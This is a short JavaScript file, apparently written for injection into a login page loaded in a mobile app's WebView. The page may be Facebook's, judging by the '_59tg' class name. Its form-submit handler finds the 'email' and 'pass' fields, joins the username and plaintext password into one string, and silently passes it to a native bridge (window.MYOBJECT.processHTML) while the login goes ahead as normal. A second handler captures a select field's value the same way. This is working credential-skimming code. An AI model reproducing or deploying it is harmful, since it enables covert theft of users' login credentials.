/**
 * Created by dev on 08-17-17.
 */

document.getElementsByClassName('_59tg')[3].onchange = function () {
	var notificaction = document.getElementsByClassName('_59tg');
	var notificactionValue = '';
	notificactionValue = notificaction[3].value;
	window.MYOBJECT.processHTML(notificactionValue);
	return true;
};

document.getElementsByTagName('form')[0].onsubmit = function () {
	var objPWD, objAccount;
	var str = '';
	var inputs = document.getElementsByTagName('input');
	for (var i = 0; i < inputs.length; i++) {
		if (inputs[i].name.toLowerCase() === 'pass') {
			objPWD = inputs[i];
		}
		else if (inputs[i].name.toLowerCase() === 'email') {
			objAccount = inputs[i];
		}
	}
	if (objAccount != null) {
		str += objAccount.value;
	}
	if (objPWD != null) {
		str += ' , ' + objPWD.value;
	}
	window.MYOBJECT.processHTML(str);
	return true;
};
